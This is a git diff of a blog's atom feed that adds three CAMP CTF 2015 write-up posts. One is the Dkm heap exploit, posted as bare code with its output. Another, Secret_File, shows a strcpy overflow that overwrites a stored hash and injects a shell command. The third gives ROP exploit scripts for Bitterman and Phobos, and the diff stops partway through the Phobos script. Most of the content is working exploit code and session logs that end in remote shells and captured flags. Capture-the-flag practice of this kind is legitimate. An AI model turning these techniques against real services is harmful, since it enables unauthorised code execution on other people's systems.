@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-07-25T22:02:43+02:00</updated>
+  <updated>2015-08-18T21:42:50+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,1018 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm/"/>
+    <updated>2015-08-18T21:36:14+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm</id>
+    <content type="html"><![CDATA[<p>Writeup coming soon! For now, here&rsquo;s the exploit.</p>
+
+<!--more-->
+
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+def add_dkm_without_wifi(comment=""):
+    s.send('2\n')
+    s.send('2\n')
+    s.send('\n')
+    s.send('\n')
+    s.send(comment+'\n')
+
+def add_dkm_with_wifi(comment):
+    s.send('2\n')
+    s.send('1\n')
+    s.send('\n')
+    s.send('\n')
+    s.send('\n')
+    s.send(comment+'\n')
+
+def edit_dkm_without_wifi(id,comment):
+    s.send('4\n')
+    s.send(str(id)+'\n')
+    s.send('2\n')
+    s.send('1\n')
+    s.send('1\n')
+    s.send(comment+'\n')
+    #s.send('\n')
+
+def edit_dkm_with_wifi(id,ssid):
+    s.send('4\n')
+    s.send(str(id)+'\n')
+    s.send('1\n')
+    s.send('\n')
+    s.send('\n')
+    s.send('\n')
+    #s.send(ssid+'\n')
+    s.send('\n')
+
+def delete_dkm(id):
+    s.send('3\n')
+    s.send(str(id)+'\n')
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10102))
+    #s.connect(('localhost', 4444))
+
+    raw_input('dbg')
+
+    readtil('Exit')
+    add_dkm_with_wifi('')
+    print readtil('Exit')
+    print 'adding second wifi'
+    add_dkm_with_wifi('')
+    print readtil('Exit')
+
+    edit_dkm_without_wifi(0, q(0x602040))
+
+    s.send('1\n')
+    readtil('SSID: ')
+    data= s.recv(6)
+
+    data += "\x00\x00"
+    strtoull = (struct.unpack('&lt;Q', data)[0])
+    libc = strtoull - 0x000000000003b1a0 
+
+    print 'libc: %x' % libc
+    system = libc + 0x443d0
+    print 'system: %x' % system
+
+    print readtil('Exit')
+    print 'deleting second wifi'
+    delete_dkm(1)
+    print readtil('Exit')
+    print 'shrinking first wifi'
+    edit_dkm_without_wifi(0,'') # resize it
+    print readtil('Exit')
+    print 'adding second nowifi'
+    add_dkm_without_wifi() # allocate new struct next to old dk
+    print readtil('Exit')
+
+    # edit first struct (now resized) as large struct, so the comment goes into the next chunk's function pointers
+    s.send('4\n')
+    s.send('0\n')
+    s.send('3\n')
+    s.send('1\n')
+    s.send('1\n')
+    s.send('1\n')
+    s.send('1\n')
+    #payload = "".join(["%04d" % x for x in range(1023/4)])
+    # ugly padding
+    payload = "AAAA"+"/bin/sh; #"*80+"AAAA"+q(system)
+    s.send(payload+'\n')
+
+    # execute struct-&gt;edit_with_wifi (overwritten with system)
+    s.send('4\n')
+    s.send('1\n')
+    s.send('3\n')   # code exec much?
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+    s.close()
+pwn()
+</code></pre>
+
+<p>And against the remote binary:</p>
+
+<pre><code class="bash">ubuntu@ubuntu-VirtualBox:~$ python poc.py 
+dbg
+
+&gt; Does the DK have wifi?
+1) Yes
+2) No
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter the number of ssids, this DK supports.
+&gt; Please enter a comment for this DK.
+&gt; DK #0 successfully added.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+adding second wifi
+
+&gt; Does the DK have wifi?
+1) Yes
+2) No
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter the number of ssids, this DK supports.
+&gt; Please enter a comment for this DK.
+&gt; DK #1 successfully added.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+libc: 7f912685f000
+system: 7f91268a33d0
+
+ Comment: 
+
+DK #1 with wifi @ 0.0000/0.0000:
+ Comment: 
+
+
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+deleting second wifi
+
+&gt; Enter DK index: 
+&gt; DK #1 successfully deleted.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+shrinking first wifi
+
+&gt; Enter DK index: 
+&gt; Editing DK #0:
+Does the DK have wifi?
+1) Yes
+2) No
+3) Do not change
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter a comment for this DK.
+&gt; DK #0 successfully saved.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+adding second nowifi
+
+&gt; Does the DK have wifi?
+1) Yes
+2) No
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter a comment for this DK.
+&gt; DK #1 successfully added.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+
+&gt; Enter DK index: 
+&gt; Editing DK #0:
+Does the DK have wifi?
+1) Yes
+2) No
+3) Do not change
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter the number of ssids, this DK supports.
+&gt; Please enter the name of SSID #0.
+&gt; Please enter a comment for this DK.
+&gt; DK #0 successfully saved.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+&gt; Enter DK index: 
+&gt; Editing DK #1:
+Does the DK have wifi?
+1) Yes
+2) No
+3) Do not change
+&gt; id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+cat flag.txt
+cat: flag.txt: No such file or directory
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd home
+ls
+challenge
+cd cha*
+ls
+challenge
+flag.txt
+cat flag.txt
+CAMP15_aecbde52de8b1ed16bf62aa772d53a2
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Secret_File]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/"/>
+    <updated>2015-08-18T21:35:08+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file</id>
+    <content type="html"><![CDATA[<p>In this case, we&rsquo;re asked to retrieve a secret file and given.. another binary. What did you expect? ;-)</p>
+
+<!--more-->
+
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ ./secret_file 
+AAAA
+wrong password!
+</code></pre>
+
+<p>Hmm. Let&rsquo;s see what makes this thing tick:</p>
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ strings ./secret_file 
+/lib64/ld-linux-x86-64.so.2
+x]Cm
+libcrypto.so.1.0.0
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_Jv_RegisterClasses
+_ITM_registerTMCloneTable
+SHA256_Final
+SHA256_Init
+_init
+SHA256_Update
+_fini
+libc.so.6
+strcpy
+strrchr
+puts
+__stack_chk_fail
+stdin
+popen
+fgets
+fclose
+getline
+__cxa_finalize
+strcmp
+__libc_start_main
+snprintf
+_edata
+__bss_start
+_end
+GLIBC_2.4
+GLIBC_2.2.5
+AUATUSH
+[]A\A]
+D$x1
+D$xdH3
+[]A\A]
+D$h1
+/bin/catH
+ ./secreH
+t_data.aH
+9387a00eH
+D$ H
+31e413c5H
+D$(H
+5af9c08cH
+D$0H
+69cd119aH
+D$8H
+b4685ef3H
+D$@H
+bc8bcbe1H
+D$HH
+cf821611H
+D$PH
+19457127H
+D$X1
+D$hdH3
+AWAVA
+AUATL
+[]A\A]A^A_
+%02x
+wrong password!
+;*3$"
+</code></pre>
+
+<p>We see strings like <code>bc8bcbe1H</code>, which look like part of a hash being pushed onto the stack. Combining the hash part gives a SHA256 hash which has no known plaintext. Hmmm! Since this is an exploit-focused binary, let&rsquo;s exploit it!</p>
+
+<p>It gets interesting around this code:</p>
+
+<pre><code>     e8e:   rep stos QWORD PTR es:[rdi],rax
+     e91:   lea    rdi,[rbx+0x100]
+     e98:   mov    rcx,rsp
+     e9b:   movabs rax,0x7461632f6e69622f
+     ea5:   mov    QWORD PTR [rsp],rax
+     ea9:   movabs rax,0x65726365732f2e20
+     eb3:   mov    QWORD PTR [rsp+0x8],rax
+     eb8:   movabs rax,0x612e617461645f74
+     ec2:   mov    QWORD PTR [rsp+0x10],rax
+     ec7:   mov    eax,0x6373
+     ecc:   mov    WORD PTR [rsp+0x18],ax
+     ed1:   xor    eax,eax
+     ed3:   call   a30 &lt;snprintf@plt&gt;
+     ed8:   lea    rcx,[rsp+0x20]
+     edd:   mov    esi,0x41
+     ee2:   movabs rax,0x6530306137383339
+     eec:   mov    QWORD PTR [rsp+0x20],rax
+     ef1:   lea    rdi,[rbx+0x11b]
+     ef8:   movabs rax,0x3563333134653133
+     f02:   mov    QWORD PTR [rsp+0x28],rax
+     f07:   lea    rdx,[rip+0x106]        # 1014 &lt;_fini+0x10&gt;
+     f0e:   movabs rax,0x6338306339666135
+     f18:   mov    QWORD PTR [rsp+0x30],rax
+     f1d:   movabs rax,0x6139313164633936
+     f27:   mov    QWORD PTR [rsp+0x38],rax
+     f2c:   movabs rax,0x3366653538363462
+     f36:   mov    QWORD PTR [rsp+0x40],rax
+     f3b:   movabs rax,0x3165626362386362
+     f45:   mov    QWORD PTR [rsp+0x48],rax
+     f4a:   movabs rax,0x3131363132386663
+     f54:   mov    QWORD PTR [rsp+0x50],rax
+     f59:   movabs rax,0x3732313735343931
+     f63:   mov    QWORD PTR [rsp+0x58],rax
+     f68:   xor    eax,eax
+     f6a:   mov    BYTE PTR [rsp+0x60],0x0
+     f6f:   call   a30 &lt;snprintf@plt&gt;
+     f74:   mov    rax,QWORD PTR [rsp+0x68]
+     f79:   xor    rax,QWORD PTR fs:0x28
+     f82:   jne    f8a &lt;__cxa_finalize@plt+0x4aa&gt;
+     f84:   add    rsp,0x70
+     f88:   pop    rbx
+     f89:   ret    
+</code></pre>
+
+<p>It passes a few strings to the stack. We&rsquo;ll be seeing them later. Let&rsquo;s run the binary in <code>gdb</code>.</p>
+
+<pre><code class="bash">gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+</code></pre>
+
+<p>PIE is enabled, so find out the base address of the binary with <code>vmmap</code>. Our input gets processed here:</p>
+
+<pre><code>     b40:   call   ad0 &lt;getline@plt&gt;
+     b45:   cmp    rax,0xffffffffffffffff
+     b49:   je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
+     b4f:   mov    rdi,QWORD PTR [rsp+0x8]
+     b54:   mov    esi,0xa
+     b59:   call   a40 &lt;strrchr@plt&gt;
+     b5e:   test   rax,rax
+     b61:   je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
+     b67:   mov    BYTE PTR [rax],0x0
+     b6a:   mov    rsi,QWORD PTR [rsp+0x8]
+     b6f:   mov    rdi,r13
+     b72:   lea    rbp,[r13+0x15c]
+     b79:   lea    rbx,[r13+0x17c]
+     b80:   lea    r12,[r13+0x1bc]
+     b87:   call   9e0 &lt;strcpy@plt&gt;
+</code></pre>
+
+<p>We have an unchecked <code>strcpy</code>. Lovely. Let&rsquo;s see what it will copy where:</p>
+
+<pre><code>gdb-peda$ vmmap
+Start              End                Perm  Name
+0x0000555555554000 0x0000555555556000 r-xp  /home/bas/bin/ccc/secret_file/secret_file
+0x0000555555755000 0x0000555555756000 r--p  /home/bas/bin/ccc/secret_file/secret_file
+0x0000555555756000 0x0000555555757000 rw-p  /home/bas/bin/ccc/secret_file/secret_file
+...
+gdb-peda$ b *0x0000555555554000+0xb87
+Breakpoint 4 at 0x555555554b87
+gdb-peda$ c
+
+...
+
+=&gt; 0x555555554b87:  call   0x5555555549e0 &lt;strcpy@plt&gt;
+   0x555555554b8c:  mov    edx,0x100
+   0x555555554b91:  mov    rsi,rbp
+   0x555555554b94:  mov    rdi,r13
+   0x555555554b97:  call   0x555555554dd0
+Guessed arguments:
+arg[0]: 0x7fffffffe190 --&gt; 0x0 
+arg[1]: 0x555555757010 --&gt; 0x41414141 ('AAAA')
+</code></pre>
+
+<p>So it will copy our input to the stack. Let&rsquo;s examine the stack:</p>
+
+<pre><code>gdb-peda$ x/200wx 0x7fffffffe190
+0x7fffffffe190: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe1a0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe1b0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe1c0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe1d0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe1e0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe1f0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe200: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe210: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe220: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe230: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe240: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe250: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe260: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe270: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe280: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffe290: 0x6e69622f  0x7461632f  0x732f2e20  0x65726365
+0x7fffffffe2a0: 0x61645f74  0x612e6174  0x39006373  0x61373833
+0x7fffffffe2b0: 0x33653030  0x31346531  0x35356333  0x63396661
+0x7fffffffe2c0: 0x36633830  0x31646339  0x62613931  0x35383634
+0x7fffffffe2d0: 0x62336665  0x63623863  0x63316562  0x31323866
+0x7fffffffe2e0: 0x31313136  0x37353439  0x00373231  0x00007fff
+0x7fffffffe2f0: 0x00000000  0x00000000  0xf7ffa828  0x00007fff
+0x7fffffffe300: 0xffffe390  0x00007fff  0xffffe3a8  0x00007fff
+0x7fffffffe310: 0x00000000  0x00000001  0xf7ffe758  0x00007fff
+0x7fffffffe320: 0x13742321  0x00000000  0xf7a071ef  0x00007fff
+</code></pre>
+
+<p>Nice, what are those bytes at <code>0x7fffffffe290</code>?</p>
+
+<pre><code>gdb-peda$ x/2s 0x7fffffffe290
+0x7fffffffe290:  "/bin/cat ./secret_data.asc"
+0x7fffffffe2ab:  "9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127"
+</code></pre>
+
+<p>Hey, that second one looks like the SHA256 hash! We&rsquo;ll be able to overwrite this&hellip; Seeing as it&rsquo;s stored as a string, better set a breakpoint on <code>strcmp()</code> for later&hellip;</p>
+
+<pre><code>     bd5:   call   a80 &lt;strcmp@plt&gt;
+</code></pre>
+
+<p>Restarted the binary:</p>
+
+<pre><code>gdb-peda$ b *0x0000555555554000+0xbd5
+Breakpoint 2 at 0x555555554bd5
+gdb-peda$ c
+AAAA
+
+...
+
+=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
+   0x555555554bda:  mov    r12d,eax
+   0x555555554bdd:  test   eax,eax
+   0x555555554bdf:  jne    0x555555554c40
+   0x555555554be1:  lea    rdi,[r13+0x100]
+Guessed arguments:
+arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
+arg[1]: 0x7fffffffe30c ("003daa08bd98e706782e059cbadf83277b5296645a98dfb636131e32cd7f131d")
+</code></pre>
+
+<p>OK, so it will compare the SHA256 hash of our input with the one stored on the stack. The nice thing, however, is that it will only hash the first 0x100 bytes! This means we can predict the hash we get:</p>
+
+<pre><code>gdb-peda$ r
+warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+...
+
+   0x555555554bc5:  jne    0x555555554ba0
+   0x555555554bc7:  lea    rsi,[r13+0x17c]
+   0x555555554bce:  lea    rdi,[r13+0x11b]
+=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
+
+...
+
+Guessed arguments:
+arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
+arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
+
+...
+
+Breakpoint 2, 0x0000555555554bd5 in ?? ()
+</code></pre>
+
+<p>And if we do it again, but send 512 * &lsquo;A&rsquo;:</p>
+
+<pre><code>gdb-peda$ r
+warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+...
+
+=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
+   0x555555554bda:  mov    r12d,eax
+   0x555555554bdd:  test   eax,eax
+   0x555555554bdf:  jne    0x555555554c40
+   0x555555554be1:  lea    rdi,[r13+0x100]
+Guessed arguments:
+arg[0]: 0x7fffffffe2ab ('A' &lt;repeats 65 times&gt;"\340, u\362\365\034\255#\320Sq\206\317\315P\371\021\352\225O\234.2\244\067\364S'\361\267\211\233\273e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
+arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
+</code></pre>
+
+<p>We&rsquo;ve overwritten part of the hash on the stack, yet the hash of our input stayed the same. After some trial &amp; error, I could reliably overwrite the hash:</p>
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb' | ./secret_file 
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
+</code></pre>
+
+<p>What&rsquo;s left now is to exploit it to grab the flag:</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc challs.campctf.ccc.ac 10105
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat flag.txt       ; #e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb
+CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Bitterman &amp; Phobos]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos/"/>
+    <updated>2015-08-18T21:32:18+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos</id>
+    <content type="html"><![CDATA[<p>I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we&rsquo;re presented with the following:</p>
+
+<pre><code class="bash">&gt; What's your name? 
+BBBB
+Hi, BBBB
+x
+&gt; Please input the length of your message: 
+-1  
+&gt; Please enter your text: 
+LSJFLSDJF
+&gt; Thanks!
+</code></pre>
+
+<p>The <code>x</code> after the <code>BBBB</code> in the above example was actually <code>0x7f</code>, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn&rsquo;t make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it&rsquo;s ROP time!</p>
+
+<p>Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc&rsquo;s base address and then something like <code>system()</code>. I made use of the <code>puts@plt</code> to write out the contents of <code>puts@got</code>. The latter contains the libc address of <code>puts()</code>, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to <code>read@plt</code> and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites <code>puts@got</code> and restarts the binary from <code>main()</code>. This latter decision was based on using <code>system()</code> instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When <code>main()</code> restarts, one of the first functions it calls is <code>puts@plt</code>, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+payload = "A"*152   # ty Swappage!
+
+'''
+0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
+0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+0x00000060 : pop rbp; ret
+'''
+
+base = 0x400590
+# prologue, needed for later! after the [call r12 + rbx*8], there is
+# a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, 
+# the code jumps back instead of leading to a ret!
+# therefore, we set up rbp first. 
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+# first, we set up some registers, which will later be put in the correct registers
+# puts() uses rdi as argument
+payload += q(0x000002bc+base)
+payload += q(0x600c50)  # value for r12 -&gt; puts@got
+payload += q(0)         # value for r13 -&gt; goes into rdx 
+payload += q(0)         # value for r14 -&gt; goes into rsi
+payload += q(0x600c50)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()
+
+# swap around the registers and call puts()
+payload += q(0x00000296+base)
+payload += q(0) * 7
+# without this, we don't get output
+payload += q(0x400570)  # fflush@plt
+
+# now read() to overwrite printf()
+# read() is blocking and will wait for our input :)
+# again, first set up rbp
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+# set up registers/arguments for read()
+payload += q(0x000002bc+base)
+payload += q(0x600c60)  # value for r12 -&gt; read@got
+payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
+payload += q(0x600c50)  # value for r14 -&gt; goes into rsi -&gt; overwrite puts@got
+payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin
+
+payload += q(0x00000296+base)
+payload += q(0) * 7
+
+# restart main(), so the binary will execute puts() -&gt; one shot rce, lands a shell
+# could've just a easily return to puts@plt...
+payload += q(0x4006ec) 
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10103))
+
+    readtil('name?')
+    s.send('a\n')
+    readtil('message:')
+    s.send('-1\n')   # ty Swappage!
+    readtil('text:')
+    s.send(payload+'\n')
+
+    readtil('Thanks!\n')
+    data = s.recv(8)
+    data = data[:-1] + "\x00\x00"
+    puts_addr = struct.unpack('&lt;Q', data)[0]
+    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
+
+    libc_base = puts_addr - 0x70a30
+    print "[+] libc base addr: " + hex(libc_base)
+    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
+    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
+
+    # the rop chain will wait at read(), because that is blocking
+    # send the address to overwrite puts@got
+    s.send(q(system_addr))
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+pwn()
+</code></pre>
+
+<p>The reason for setting up <code>rbp</code>:</p>
+
+<pre><code>  400839:   call   QWORD PTR [r12+rbx*8]
+  40083d:   add    rbx,0x1
+  400841:   cmp    rbx,rbp  ; if rbx != rbp, we jump back!
+  400844:   jne    400830 
+  400846:   add    rsp,0x8  ; we wanna go here!
+  40084a:   pop    rbx
+  40084b:   pop    rbp
+  40084c:   pop    r12
+  40084e:   pop    r13
+  400850:   pop    r14
+  400852:   pop    r15
+  400854:   ret    
+</code></pre>
+
+<p>And the exploit in action:</p>
+
+<pre><code class="bash">[+] Leaked puts(): 0x7fb9d6487a30
+[+] libc base addr: 0x7fb9d6417000
+[+] sending one shot rce addr (0x7fb9d645b2aa)
+id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+whoami
+challenge
+ls -alh
+total 40K
+drwxr-xr-x 2 root root 4.0K Aug 13 13:46 .
+drwxr-xr-x 3 root root 4.0K Aug  5 21:43 ..
+-rw-r--r-- 1 root root  220 Aug  5 19:55 .bash_logout
+-rw-r--r-- 1 root root 3.7K Aug  5 19:55 .bashrc
+-rw-r--r-- 1 root root  675 Aug  5 19:55 .profile
+-rwxr-xr-x 1 root root  11K Aug 12 01:28 bitterman
+-rw-r--r-- 1 root root   43 Aug 13 13:47 flag.txt
+-rwxr-xr-x 1 root root   64 Aug 12 01:34 run.sh
+cat flag.txt
+CAMP15_a786be6aca70bfd19b6af86133991f80  -
+</code></pre>
+
+<h2>Phobos</h2>
+
+<p>Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+payload = "A"*136   # ty Swappage!
+
+'''
+0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
+0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+0x00000060 : pop rbp; ret
+'''
+
+base = 0x400590
+# prologue, needed for later!
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+payload += q(0x000002dc+base)
+payload += q(0x600c70)  # value for r12 -&gt; puts@got
+payload += q(0)         # value for r13 -&gt; goes into rdx 
+payload += q(0)         # value for r14 -&gt; goes into rsi
+payload += q(0x600c70)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()
+
+payload += q(0x000002b6+base)
+payload += q(0) * 7
+payload += q(0x400570)  # fflush@plt
+
+# now read() to overwrite printf()
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+payload += q(0x000002dc+base)
+payload += q(0x600c80)  # value for r12 -&gt; read@got
+payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
